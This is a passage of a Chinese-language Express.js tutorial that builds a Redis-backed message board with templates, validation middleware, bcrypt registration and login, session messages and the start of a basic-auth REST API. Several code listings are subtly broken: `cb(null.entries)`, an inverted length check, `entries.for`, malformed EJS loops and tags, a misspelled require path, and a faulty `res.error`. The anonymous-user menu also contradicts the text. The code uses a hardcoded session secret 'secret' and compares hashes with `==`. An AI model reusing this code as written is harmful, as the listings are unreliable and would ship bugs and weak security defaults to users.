要靠扩展名确定哪个模板引擎渲染文件，有了这个配置项，我们可以用 index 指定要渲染的文件，而不需要 index.ejs. 使用带扩展名的模板文件，就可以在同一个 Express 程序中使用多个模板引擎。同时这样又能提供一个清晰的 API。 比如说，你发现用另一种模板引擎写 RSS 预订源更容易，或者正要换一个模板引擎用。你可能将 Pug 作为默认引擎，用 EJS 渲染 /feed 路由的响应结果，就像下面的代码一样指明 .ejs 扩展名。 1234567app.set('view engine','pug');app.get('/',function()&#123; res.render('index');&#125;);app.get('/feed',function()&#123; res.render('rss.ejs');&#125;); 视图缓存 在生产环境中，view cache 是默认开启的。以防止后续的 render() 从硬盘中读取模块文件。因为模块文件的内容会被放到内存中，所以性能会得到显著提升。但启用这个配置项后，只有重启服务器才能让模板文件的编辑生效，所以在开发时会禁用它。如果在分级（staging）环境中运行，很可能要启用和这个配置项。 view cache 被禁用时，每次请求都会从硬盘上读取模板。这样无须重启程序来让模板的修改生效。启用 view cache 后，每个模板只需要读取一次硬盘。 我们看看 Express如何定位视图来渲染它们。 视图查找 查找视图的过程跟 require() 查找的过程差不多，在程序中调用了 res.render() 或 app.render()后，Express 会先检查有没有这样的绝对路径，接着查找目录的相对路径。最后会尝试找目录中的 index 文件。 因为 ejs 被设为默认引擎，所以无须在 render 中指明模板文件的扩展名.ejs。 随着开发进展，程序中的视图会越来越多，并且有时一个资源会有几个视图。view lookup可以帮我们组织这些视图，比如说把视图文件放在跟资源相连的子目录中。 用添加子目录的办法可以去掉模板文件名称中的冗余部分，比如 edit-entry.ejs和 show-entry.ejs。Express 会添加跟 view engine 匹配的扩展名，根据 res.render(‘entries/edit’)定位到 ./views/entries/edit.ejs。 Express会检查 views的子目录中是否有名为 index的文件。当文件的名称为复数时，比如 entries，通常表示这是一个资源列表。也就是说 res.render(‘entries’)一般会渲染文件views/entries/ index.ejs。 将数据传递给视图的办法 在 Express 中，要给被渲染的视图传递数据有几种办法，其中最常用的是将要传递的数据作为 res.render()的参数。此外，还可以在路由处理器之前的中间件中设定一些变量，比如用app.locals 传递程序层面的数据，用 res.locals 传递请求层面的数据。 将变量直接作为 res.render()的参数优先级最高，要高于在 res.locals 和 app.locals中设定的变量值: 默认情况下，Express 只会向视图中传递一个程序级变量——settings，这个对象中包含所有用 app.set()设定的值。比如 app.set(‘title’, ‘My Application’)会把 settings. title 输出到模板中，请看下面的 EJS 代码片段： 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= settings.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= settings.title %&gt;&lt;/h1&gt; &lt;p&gt;Welcome to &lt;%= settings.title %&gt;.&lt;/p&gt; &lt;/body&gt; 实际上，Express 是像下面这样输出这个对象的： 1app.locals.settings = app.settings Express 路由入门Express 路由的主要任务是将特定模式上的 URL 匹配到响应逻辑上。但也可以将 URL 模式匹配到中间件上，以便于中间件实现某些路由上的可重用功能。 特定路由中间件的用法。 检验用户内容提交 给程序加上消息提交功能，实现这个功能需要下面几项工作： 创建消息模型 添加与模型消息相关的路由 创建消息表单 添加业务逻辑，用提交上来的表单数据创建消息 创建消息模型创建模型之前，要先安装 Node redis 模块： 1npm i -S redis 借助 Redis 和 ES6 可以轻松创建出来轻便的模型。 下面的这个ES6 类会把数据存在 Redis 列表中。 12345678910111213141516171819202122232425262728// models/entry.jsconst redis = require('redis');// 创建 Redis 客户端实例const db = redis.createClient();class Entry &#123; constructor(obj) &#123; // 循环遍历传入对象的值 for (let key in obj) &#123; // 合并值 this[key] = obj[key]; &#125; &#125; save(cb) &#123; // 将保持的消息转换成 JSON 字符串 const entryJSON = JSON.stringify(this); // 将 JSON 字符串保存到 Redis 列表中 db.lpush( 'entries', entryJSON, (err) =&gt; &#123; if (err) return cb(err); cb(); &#125; ); &#125;&#125;module.exports = Entry; 基本模型有了，现在要添加获取消息用的 getRange 函数，代码如下所示，你可以用这个函数获取消息。 123456789101112static getRange(from, to, cb) &#123; // 用来获取消息记录的 Redis lrange 函数 db.lrange('entries', from, to, (err, items) =&gt; &#123; if (err) return cb(err); let entries = []; // 解码之前保存为 JSON 的消息记录 items.forEach(item =&gt; &#123; entries.push(JSON.parse(item)); &#125;); cb(null.entries); &#125;);&#125; 创建好模型，现在就可以添加路由来创建消息和获取消息了。 创建消息表单123// app.jsapp.get('/post', entries.form); app.post('/post', entries.submit); 接着把下面的代码添加到 routes/entries.js 中。这个路由逻辑会渲染一个包含表单的模板： 123exports.form = (req, res) =&gt; &#123; res.render('post', &#123; title: 'Post' &#125;);&#125; 然后用下面的 EJS 代码创建表单模板 views/post.ejs 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; &lt;%= title %&gt; &lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/stylesheet/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;%= include menu %&gt; &lt;h1&gt; &lt;%= title%&gt; &lt;/h1&gt; &lt;p&gt;Fill in the form below to add a new post&lt;/p&gt; &lt;form action=&quot;/post&quot; method=&quot;post&quot;&gt; &lt;p&gt; &lt;input type=&quot;text&quot; name=&quot;entry[title]&quot; placeholder=&quot;Title&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;textarea name=&quot;entry[body]&quot; placeholder=&quot;Body&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; value=&quot;Post&quot;&gt; &lt;/p&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 这个表单用了形如 entry[title]之类的输入控件名称，需要用扩展的消息体解析器来解析。 1app.use(express.urlencoded(&#123; extended: true &#125;)); 显示表单的页面做好了，接下来我们要用表单提交上来的数据创建消息。 实现消息的创建把下面的代码添加到文件 routes/entries.js 中，实现用表单提交上来的数据创建消息。 123456789101112131415const Entry = require('../models/entry');exports.submit = (req, res, next) =&gt; &#123; const data = req.body.entry; const user = res.locals.user; const username = user ? user.name : null; const entry = new Entry(&#123; username: username, title: data.title, body: data.body &#125;); entry.save(err =&gt; &#123; if (err) return next(err); res.redirect('/'); &#125;);&#125; 添加显示消息首页先创建 routes/entries，然后把下面的代码放到里面，引入消息模型，输出渲染消息列表的函数。 12345678910exports.list = (req, res, next) =&gt; &#123; Entry.getRange(0, -1, (err, entries) =&gt; &#123; if (err) return next(err); // 渲染 HTTP 响应 res.render('entries', &#123; title: 'Entries', entries: entries &#125;); &#125;);&#125; 这个路由的业务逻辑定义好之后，还需要添加 EJS 模板来显示这些消息。在 views 目录下创建 entries.ejs 文件，并加入下面的 EJS 代码。 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Page Title&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;/stylesheets/style.css&quot; /&gt;&lt;/head&gt;&lt;body&gt; &lt;% include menu %&gt; &lt;%entries.for((entry) =&gt;&#123; %&gt; &lt;div class=&quot;entry&quot;&gt; &lt;h3&gt;&lt;%= entry.title%&gt;&lt;/h3&gt; &lt;p&gt;&lt;%= entry.body&gt;&lt;/p&gt; &lt;p&gt;Post by &lt;%= entry.username%&gt;&lt;/p&gt; &lt;/div&gt; &lt;%&#125;)%&gt;&lt;/body&gt;&lt;/html&gt; 在运行程序之前，先创建菜单模板文件menu.ejs ，后面再添加具体代码。视图和路由准备好后，需要告诉程序到哪里去找这些路由。 添加与消息相关的路由在把与消息相关的路由添加到程序中之前，需要调整一下 app.js。先把下面这个 require语句放在 app.js 文件的顶端： 1app.get('/', entries.list); 现在运行这个程序，首页会显示消息列表。 既然消息创建和显示列表都做好了，那么接下来该看看如何用特定路由中间件校验表单数据了. 使用特定路由中间件假定你想将表单中的消息文本域设为必填项。能想到的第一种方式可能是像下面的代码那样把它直接加在路由回调函数中。然而这种方式并不理想，因为校验逻辑是绑死在这个表单上的。而在大多数情况下，校验逻辑都能被提炼到可重用的组件中，让开发更容易、更快、更具声明性： 12345678910111213141516171819202122232425exports.submit = (req, res, next) =&gt; &#123; const data = req.body.entry; // 校验 if (!data.title) &#123; res.error('Title is required.'); res.redirect('back'); return; &#125; if (!data.title.length &lt; 4) &#123; res.error('Title must be longer than 4 characters.'); res.redirect('back'); return; &#125; const user = res.locals.user; const username = user ? user.name : null; const entry = new Entry(&#123; username: username, title: data.title, body: data.body &#125;); entry.save((err) =&gt; &#123; if (err) return next(err); res.redirect('/'); &#125;);&#125; Express 路由可以有自己的中间件，其放在路由回调函数之前，只有跟这个路由匹配时才会调用。本章所用的路由回调并没有做特殊处理，这些中间件和其他中间件一样，甚至你即将创建的中间件也一样。 接下来我们要用特定路由中间件来做校验，先看一种虽然简单但不太灵活的实现方式。 用特定路由中间件实现表单校验 第一种方式是写几个简单但特定的中间件来执行校验，带有此类中间件的 POST/post 路由看起来像下面这样： 1234app.post('/post', requireEntryTitle, requireEntryTitleLengthAbove(4), entries.submit); 一般的路由定义只有两个参数：路径和路由处理函数，而这个路由定义中又额外地增加了两个参数，这两个参数就是校验中间件。 下面的代码中，我们把原来的校验逻辑剥离出来做成了两个中间件，但它们的模块化程度还不高，只能用在输入域 entry[title]上。 更有潜力但是不完美的校验组件： 1234567891011121314151617181920function requireEntryTitle(req,res,next)&#123; const title = req.body.entry.title; if(title)&#123; next(); &#125;else&#123; res.error('Title is required'); res.redirect('back'); &#125;&#125;;function requireEntryTitleLengthAbove(len)&#123; return (req,res,next) =&gt;&#123; const title = req.body.entry.title; if(title.length &gt; len)&#123; next(); &#125;else&#123; res.error(`Title must be longer than $&#123;len&#125;`); res.redirect('back'); &#125; &#125;&#125; 实际工作中更常用的方案是进一步抽象，剥离成更灵活的校验器，以目标输入域的名称为参数进行校验。下面来看一下这种实现方式。 构建灵活的校验中间件 如果能重用校验逻辑，可以像下面这样传入输入域名称，那我们的工作量会进一步降低 1234app.post('/post', validate.required('entry[title]'), validate.lengthAbove('entry[title]',4), entries.submit); 打开 app.js，把路由部分的 app.post(‘/post’, entries.submit);换成上面这段代码。这里有必要提一下，Express 社区已经创建了很多类似的公用库，但掌握校验中间件的工作机制以及如何编写中间件仍然很有必要. 创建 ./middleware/validate.js 文件。validate.js会输出 validate.required()和 validate.lengthAbove()两个中间件。这里的实现细节并不重要，关键是通过这个例子学习如何提炼出程序中的通用代码，用少量的工作成果发挥作用 为了让程序能访问到这个中间件，需要把下面这行代码放到 app.js 中： 1const validate = require('./middleware/validate'); 用户认证 本节会从头给程序创建一个认证系统，实现以下功能： 存储和认证已注册用户 注册功能 登录功能 加载用户信息的中间件 我们还是用 Redis 作为用户账号的存储，接下来创建 User 模型，看看如何让 Redis 用起来更加容易 1.保存和加载用户记录实现用户加载、保存和认证，任务清单是： 用 package.json 定义程序的依赖项 创建用户模型 用 Redis 加载和保存用户信息 用 bcrypt 增强用户密码的安全性 实现用户认证 Bcrypt 是一个加盐的哈希函数，可作为第三方模块专门对密码做哈希处理。Bcrypt 特别适合处理密码，因为计算机越来越快，而 bcrypt 能让破解变慢，从而有效对抗暴力攻击。 先安装： 1npm i -S redis bcrypt 2.创建用户模型在 models 文件夹下面创建 user.js 下面的代码引入了依赖项 redis 和 bcrypt，然后用 redis.createClient() 打开 Redis 连接。函数 User 可以合并传入的参数对象。比如说，new User({name:’Tobi’})会创建一个对象，并将对象的属性 name 设为 Tobi. 12345678910111213141516const redis = require('redis');const bcrypt = require('bcrypt');// 创建到 Redis 的长连接const db = redis.createClient();class User &#123; constructor(obj) &#123; // 循环遍历传入的对象 for (let key in obj) &#123; // 设定当前类的所有属性 this[key] = obj[key]; &#125; &#125;&#125;module.exports = User; 现在这个用户模型只是个架子，还需要创建和更新记录的方法。 3.把用户保存到 Redis 中接下来要实现的功能是保存用户，把数据存到 Redis 中，save 方法会先检查用户是否有ID，如果没有就调用 update 方法，用名称索引用户 ID ，并把对象的属性组装出 Redis 哈希表中的记录，如果没有 ID ，则认为这是一个新用户，增加 user.ids 的值，给用户一个唯一的 ID ，然后对密码进行哈希处理，用之前提到的那个 update 方法将数据存到 Redis 中。 1234567891011121314151617181920212223242526272829save(cb) &#123; if (this.id) &#123; // 如果设置了 ID，则用户已经存在了 this.update(cb); &#125; else &#123; // 创建唯一的 ID db.incr('user:ids', (err, id) =&gt; &#123; if (err) return cb(err); this.id = id; // 哈希密码 this.hashPassword((err) =&gt; &#123; if (err) return cb(err); // 保存用户属性 this.update(cb); &#125;) &#125;); &#125;&#125;update(cb) &#123; const id = this.id; // 用名称索引用户 id db.set(`user:id:$&#123;this.name&#125;`, id, (err) =&gt; &#123; if (err) return cb(err); // 用 Redis 存储当前属性 db.hmset(`user:$&#123;id&#125;`, this, (err) =&gt; &#123; cb(err); &#125;); &#125;);&#125; 4.增强用户密码的安全性刚创建用户时，需要将 .pass 属性设为用户的密码。然后用户保存逻辑将 .pass 属性换做经过哈希处理的密码。 这个哈希会加盐，每个用户的加的盐不一样，加盐可以有效对抗彩虹表攻击。可以用bcrypt 的 genSalt()为哈希生成 12 个字符的盐 盐生成好之后，调用 bcrypt.hash()对.pass 属性和盐做哈希处理。在.update()把数据存到 Redis 之前，.pass 属性的值会换成最终的哈希值，保证不会保存密码的明文，只保存它的哈希结果。下面代码中定义的函数会创建加盐的哈希，并把结果存到用户的属性.pass 中。把它加到models/user.js 中。 1234567891011121314hashPassword(cb) &#123; // 生成有 12 个字符盐 bcrypt.genSalt(12, (err, salt) =&gt; &#123; if (err) return cb(err); this.salt = salt; // 生成哈希 bcrypt.hash(this.pass, salt, (err, hash) =&gt; &#123; if (err) return cb(err); // 设定哈希以便于保存 this.pass = hash; cb(); &#125;); &#125;);&#125; 5.测试用户保存逻辑接着运行 Redis-server 启动 Redis 服务器，新建一个 user-test.js，加入代码： 12345678const User = require('./models/user');const user = new User(&#123; name: 'Example', pass: 'test' &#125;);user.save((err) =&gt; &#123; // 保存用户 if (err) console.error(err); console.log('user id %d', user.id);&#125;); 可以看到类似下面的输出： 接着使用 Redis 中的工具 redis-cli ，可以用 HGETALL 命令取出哈希表中的所有键和值，如下： 6.获取用户数据在 Web 程序中，用户登录通常是在表单中输入用户名和密码，然后将这些数据提交到后台进行认证 。在得到登录表单提交的数据后，需要一个通过用户名获取信息的方法。 下面的代码中的 User.getByName 就是这样的方法，这个函数先用 User.getId() 查找用户 ID,然后把 ID 传给 User.get(),由它负责取得 Redis 哈希表中的用户数据。把下面的方法加到 models/user.js 中 1234567891011121314151617181920static getByName(name, cb) &#123; // 根据名称查找用户 ID User.getId(name, (err, id) =&gt; &#123; if (err) return cb(err); // 用 ID 抓取用户 User.get(id, cb); &#125;);&#125;static getId(name, cb) &#123; // 取得由名称索引的 ID db.get(`user:id:$&#123;name&#125;`, cb);&#125;static get(id, cb) &#123; // 获取普通对象哈希 db.hgetall(`user:$&#123;id&#125;`, (err, user) =&gt; &#123; if (err) return cb(err); // 将普通对象转换为新的 User 对象 cb(null, new User(user)) &#125;);&#125; 7.用户登录认证123456789101112131415static authenticate(name,pass,cb)&#123; // 通过用户名查找用户 User.getByName(name,(err,user) =&gt;&#123; if(err) return cb(err); // 用户不存在 if(!user.id) return cb(); bcrypt.hash(pass,user.salt,(err,hash) =&gt;&#123; if(err) return cb(err); // 匹配发现向 if(hash == user.pass) return cb(null,user); // 密码无效 cb(); &#125;); &#125;);&#125; 认证功能一开始先用用户查找用户记录，如果没有找到，马上调用回调函数，反之把保存在用户对象中的盐和提交上来的密码做哈希处理，产生的结果应该跟 user.pass 哈希值相同。如果两个哈希值不匹配，说明用户输入的凭证是无效的。当查找不存在的键时，Redis 会返回一个空的哈希值，所以这里的检查方法是 !user.id 而不是 ！user。 注册新用户为了让用户创建新账号后登陆，需要提供注册和登录功能。 完成下面的任务实现注册： 将注册和登录路由映射到URL路径上 添加显示注册表单的注册路由处理器 实现用户数据存储功能，存储从表单提交上来的用户数据 1.添加注册路由要显示注册表单，首先要创建一个路由渲染这个表单，然后把它返回给用户的浏览器显示出来。 12345678// app.jsconst register = require('./routes/register.js');app.get('/register',register.form);app.post('/register',register.submit);// routes/register.jsexports.form = (req, res) =&gt; &#123; res.render('register', &#123; title: 'Register' &#125;);&#125; app.js 新增的代码用 Node 模块系统从 routes 目录中引入定义注册路由行为的模块，并将 HTTP 方法及 URL 路径关联到路由函数上。由此构成了一个前端控制器。既有Get 路由们也有Post 路由。接着定义路由逻辑，输出渲染注册模板的路由。上面的路由用到了一个 EJS 模板，我们接下来创建用于定义注册表单的 HTML 模板。 2.创建注册表单为了定义注册表单的 HTML ，需要在 views 目录下创建 register.ejs 文件： 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;% include menu %&gt;s &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Fill in the form below to sign up&lt;/p&gt; &lt;% include messages %&gt; &lt;form action=&apos;/register&apos; method=&quot;post&quot;&gt; &lt;p&gt; &lt;input type=&quot;text&quot; name=&apos;user[name]&apos; placeholder=&quot;Username&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&quot;password&quot; name=&quot;user[pass]&quot; placeholder=&quot;password&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; value=&quot;Sign Up&quot;&gt; &lt;/p&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 注意上面的 include messages，它嵌入了另一个模板 messages.ejs。我们接下来就定义这个用来跟用户沟通的模板。 3.反馈消息传达给用户 在用户注册过程中，以及在大多数应用场景中，将反馈消息传达给用户都是必须要做的工作。 这个程序中的 messages.ejs 是用来显示错误的，它会嵌入到很多模板中。这段代码会检查是否有变量 locals.messages ，如果有，模板会遍历这个变量以显示消息对象。每个消息对象都有 type 属性（可以用消息做非错误通知） 和 string 属性（消息文本）。我们可以把要显示的错误添加到 res.locals.messages 数组中形成队列。消息显示后，调用 removeMessages 清空消息队列： 12345678&lt;% if(locals.messages) &#123;%&gt;&lt;% messages.forEach((message) =&gt;)&#123; %&gt;&lt;p class=&apos;&lt;%= message.type %&gt;&apos;&gt; &lt;%= message.string %&gt;&lt;/p&gt;&lt;% &#125;) %&gt;&lt;% removeMessages() %&gt;&lt;% &#125; %&gt; 向 res.locals.messages 中添加消息是一种简单的用户沟通方式，但在重定向后 res.locals 会丢失，所以如果要跨越请求传递消息，那么需要到会话。 4.在会话中存储临时的消息Post/Redirect/Get(PRG)是一种常用的 Web 程序设计模式，这种模式是指，用户请求表单，表单数据作为 HTTP Post 请求被提交，然后用户被重定向到另一个 Web 页面上。用户被重定向到哪里取决于表单数据是否有效。如果表单无效，程序会让用户回到表单页面，如果表单有效，程序会让用户到新的 Web 页面。PRG 模式主要是为了防止表单的重复提交。 在 Express 中，用户被重定向后，res.locals 中的内容会被重置，如果把发给用户的消息存在 res.locals 中，让它在一个会话变量中维护用户消息队列。 12345678910//./middleware/messages.jsconst express = require('express');function message(req) &#123; return (msg, type) =&gt; &#123; type = type || 'info'; let sess = req.session; sess.messages = sess.messages || []; sess.messages.push(&#123; type: type, string: msg &#125;); &#125;&#125; req.message 函数可以把消息添加到来自任何 Express 请求的会话变量中。express.response 对象是 Express 给响应对象用的原型。所有中间件和路由都能访问到添加到这个对象的属性。在前面的代码中， express.response 被赋值给了一个名为 res 的变量，这样添加属性更加容易。 这个功能需要会话支持，需要一个跟 Express 兼容的中间件模块：express-session.安装： 1npm i -S express-session 添加到 app.js 中 123456const session = require('express-session');app.use(session(&#123; secret: 'secret', resave: false, saveUninitialized: true&#125;)); 为了让添加消息更加容易，用 res.error 可以轻松地将类型为 error 的消息添加到消息队列中。它用到了前面定义的 res.message 函数： 1res.error = meg =&gt; this.message(msg,'error'); 最后一步是把这些消息输出到模板中显示。如果不做这一步，就只能把req.session.messages传给每个 res.render()调用，这很不明智。 为了解决这个问题，我们要创建一个中间件，在每个请求上用 res.session.messages 上的内容组装出 res.locals.messages，这样可以更高效地把消息输出到所有要渲染的模板上。到目前为 止，./middleware/messages.js 只是扩展了响应的原型，还没输出任何东西。把下面的代码加到这个文件中，输出我们需要的中间件： 1234567891011module.exports = (req, res, next) =&gt; &#123; res.message = message(req) res.error = (msg) =&gt; &#123; return res.message(msg, 'error'); &#125;; res.locals.messages = req.session.messages || []; res.locals.removeMessages = () =&gt; &#123; req.session.messages = []; &#125; next();&#125; 它首先定义了一个模板变量 messages 用来存放会话中的消息，在上一个请求中可能存在，也可能不存在。接下来，还需要一个把消息从会话中移除的方法，否则它们会因为没人清理而越积越多。 现在只要在 app.js 中 require() 这个文件就可以集成这个新功能了。这个中间件应该放在中间件 session下面，所以可以调用 app.use（messages），而不需调用 app.use(messages());为将来考虑，不管是否接受选项，第三方中间件最好用 app.use(messages())： 12const messages = require('./middleware/messages');app.use(messages); 这样任何视图中都可以访问到 messages 和 removeMessages()了，所以，不管出现在哪个模板中，messages.ejs 应该都可以圆满完成任务。 5.实现用户注册 我们需要一个路由函数来处理提交到 /register 上的 HTTP POST 请求。可以将这个函数命名为 submit。 当表单数据提交上来时，中间件 bodyParser()会用这些数据组装 req.body。注册表单使用了对象表示法 user[name]，经过解析后会变成 req.body.user.name。同样，req.body.user.pass表示密码输入域。 注册一完成，就会把 user.id 赋值给会话变量，稍后还要通过检查它是否存在来判断用户是否通过了认证。如果校验失败，消息会作为 messages 变量通过 res.locals.messages 输出到模板中，并且用户会被重定向回注册表单 1234567891011121314151617181920212223242526272829const User = require('../models/user');exports.form = (req, res) =&gt; &#123; res.render('register', &#123; title: 'Register' &#125;);&#125;exports.submit = (req, res, next) =&gt; &#123; const data = req.body.user; // 检查用户名是否唯一 User.getByName(data.name, (err, user) =&gt; &#123; if (err) return next(err); // 用户名被占用 if (user.id) &#123; res.error('Username already taken!'); res.redirect('back'); &#125; else &#123; // 用 POST 数据创建用户 user = new User(&#123; name: data.name, pass: data.pass &#125;); // 保存新用户 user.save(err=&gt;&#123; // 为认证保存 uid if(err) return next(err); req.session.uid = user.id; res.redirect('/'); &#125;); &#125; &#125;);&#125; 访问 /register 注册一个用户。 已注册用户登录实现登录功能比注册简单，因为之前定义的通用认证方法 User.authenticate() 里已经有登录所需的大部分代码。本节添加 显示登录表单的路由逻辑 认证从表单提交的用户数据的逻辑 修改app.js: 1234const login = require('./routes/login');app.get('/login', login.form);app.post('/login', login.submit);app.get('/logout', login.logout); 1.显示登录表单实现登录表单的第一步是为与登录和退出相关的路由创建一个文件： routers/login.js.显示登录表单的路由逻辑几乎跟之前那个显示注册表单的逻辑一模一样，唯一的区别是模板名称和页面标题不同： 123exports.form = (req, res) =&gt; &#123; res.render('login', &#123; title: 'Login' &#125;);&#125; 定义登录表单的 login.ejs 也和 注册的相似，只有说明文本和提交目标不同。 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;/head&gt; &lt;body&gt; &lt;% include menu %&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Fill in the form below to sign in!&lt;/p&gt; &lt;% include messages %&gt; &lt;form action=&apos;/login&apos; method=&apos;post&apos;&gt; &lt;p&gt; &lt;input type=&apos;text&apos; name=&apos;user[name]&apos; placeholder=&apos;Username&apos; /&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&apos;password&apos; name=&apos;user[pass]&apos; placeholder=&apos;Password&apos; /&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&apos;submit&apos; value=&apos;Login&apos; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 2.登录认证处理登录请求需要添加路由逻辑，对用户提交的用户名和密码进行检查，如果正确，将用户 ID 设为对话变量，并把用户重定向到首页上。 123456789101112131415161718//routers/login.jsconst User = require('../modlels/user');exports.submit = (req, res, next) =&gt; &#123; // 检查凭证 const data = req.body.user; User.authenticate(data.name, data.pass, (err, user) =&gt; &#123; if (err) return next(err); // 处理凭证有效的用户 if (user) &#123; // 为认证存储 uid req.session.uid = user.id; res.redirect('/'); &#125; else &#123; res.error('Sorry! invalid credentials'); res.redirect('back'); &#125; &#125;);&#125; 如果用户时使用 User.authenticate() 认证，req.session.uid 就会想在 POST/register 路由中一样赋值：这个值会保存在会话中，可以用它获取 User 或其他用户相关的数据。如果找不到匹配的记录，会设定一个错误，并重新显示登录表单。 用户可能还希望有个退出功能，所以应该在程序中提供一个退出链接。 123456exports.logout = (req, res) =&gt; &#123; req.session.destroy(err =&gt; &#123; if (err) throw err; res.redirect('/'); &#125;);&#125; 注册和登录页面都创建好了，接下来需要添加一个菜单，让用户可以进入这两个页面。 3.为已认证的和匿名的用户创建菜单在所有程序页面的 EJS 模板中，标签 &lt;body&gt;之后都有这样的一段代码，&lt;% include menu %&gt;，这是要嵌入模板 ./views/menu.ejs，接下来马上创建 123456789101112&lt;% if(locals.user) &#123; %&gt; &lt;div id=&quot;menu&quot;&gt; &lt;span class=&quot;name&quot;&gt;&lt;%= user.name %&gt;&lt;/span&gt; &lt;a href=&quot;/post&quot;&gt;post&lt;/a&gt; &lt;a href=&quot;/logout&quot;&gt;logout&lt;/a&gt; &lt;/div&gt;&lt;% &#125; else &#123; %&gt; &lt;div id=&quot;menu&quot;&gt; &lt;a href=&quot;/post&quot;&gt;post&lt;/a&gt; &lt;a href=&quot;/logout&quot;&gt;logout&lt;/a&gt; &lt;/div&gt;&lt;% &#125; %&gt; 在这个程序中，你可以假定如果有 user 变量输出到了模板中，那么这个用户就已经通过认证了，否则不会输出这个变量。也就是说当这个变量出现时，可以显示用户名、消息提交和退出链接。当访问者是匿名用户时，显示网站登录和注册链接。 我们要写一些代码为每个请求加载已登录用户的数据，并让模板可以得到这些数据. 用户加载中间件在做 Web 程序时，一般都需要从数据库中加载用户消息，通常会表示为 JavaScript 对象，为了使其与用户交互简单，要保证这项数据的可持续访问。下面要用中间件为每个请求加载用户数据。 中间件脚本会放在 ./middleware/user.js 中，它会从上层目录models 中引入 User 模型。 显示输出中间件函数，然后检查会话查看用户ID 。当用户 ID 出现时，表明用户已经通过认证，所有从 Redis 中取出用户数据是安全的。 Node 是单线程的，没有线程本地存储。对于 HTTP 服务器而言，请求和响应变量是唯一的上下文。构建在 Node 之上的高层框架可能会提供额外的对象存放已认证用户之类的数据，但 Express 坚持使用 Node 原始对象。因此，上下文数据一般保存在请求对象上，下面的代码中，用户被存储 req.user，后续中间件和路由可以用这个属性访问它。 res.locals 是 Express 提供的请求层对象，可以将数据输出给模板。 12345678910111213const User = require('../models/user');module.exports = (req,res,next) =&gt;&#123; // 从会话中取出已登录用户的 id const uid = req.session.uid; if(!uid) return next(); // 从 Redis 中取出已登录的用户的数据 User.get(uid,(err,user)=&gt;&#123; if(err) return next(err); // 将用户数据输出到响应对象中 req.user = res.locals.user = user; next(); &#125;);&#125; 改变app.js 代码，启用这个中间件。。在这个程序中，user 出现在路由器上面，所以只有路由和在 user 下面的中间件能访问 req.user。如果你正在使用加载数据的中间件，就像这个中间件一样， 可能要把 express.static 放到它上面。否则每次返回静态文件时，都会浪费时间到数据库中取用户数据。 12const user = require('./middleware/user');app.use(user); 增加菜单的样式 123456789101112131415#menu &#123; position: absolute; top: 15px; right: 20px; font-size: 12px; color: #888; &#125; #menu .name:after &#123; content: ' -'; &#125; #menu a &#123; text-decoration: none; margin-left: 5px; color: black; &#125; 创建 REST API 本节创建一个 RESTful API,让第三方程序可以跟我们的在线留言板程序互动，进行公开数据的访问和添加。按照 REST 的思想，程序数据是可以用谓语和名词（即 HTTP 方法和 URL）访问和修改的。通过 REST 请求得到的数据一般是机器可读的格式，比如 JSON 和 XML 实现 API 需要完成下面的任务: 设计一个让用户显示、列表、移除和提交消息的 API 添加基本认证 实现路由 提供 JSON 和 XML 响应 能对 API 请求进行认证和签名的技术很有很多种，本章介绍以 basic-anth 包为例的集成认证功能。 1.设计 API我们一般会在 REST ful API前加路径 /api 。 与其将回调函数放在 app.VERB() 里调用，不如把它做成单独的 Node 模块。保持路由列表的清爽简洁。 123app.get('/api/user/:id',api.user);app.get('/api/entries/:page?',api.entries);app.post('/api/entry',api.add); 2.添加基本的认证使用中间 api.auth 这一过程，会放在 routes/api.js 模块中，app.use() 方法可以接受路径参数，这在 Express 中被称为挂载点。不管是什么 HTTP 谓语，只要请求的路径以挂载点开头，就会触发这个中间件。 下面这段代码中的 app.use(‘/api’,api.auth); 应该放在加载数据的中间件前面，这样可以稍后再修改用户加载中间件，为已认证的 API 用户加载数据： 123const api = require('./routes/api');app.use('/api',api.auth);app.use(user); 要执行基本认证，安装 basic-auth 模块： 1npm i -S basic-auth 接着，创建 ./routes/api.js ，引入 Express 和用户模型，可以用 basic-auth 从请求中获取基本认证凭证，然后交给 User.authenticate 进行认证： 12345678910const auth = require('basic-auth');const express = require('express');const User = require('../models/user');exports.auth = (req, res, next) =&gt; &#123; const &#123; name, pass &#125; = auth(req); User.authenticate(name, pass, (err, user) =&gt; &#123; if (user) req.remoteUser = user; next(err); &#125;);&#125; 认证已经准备好了，接下来可以实现 API 的路由。 3.实现路由第一个要实现的路由就是 GET /api/user/:id 。先根据 ID 取得用户数据，如果用户不存在，则返回 404 Not Found 的响应状态码，如果用户存在，则吧用户数据传给 res.json() 做串行化处理，并以 JSON 格式返回数据，将下面的代码加入 到 routes/api.js 1234567exports.user = (req, res, next) =&gt; 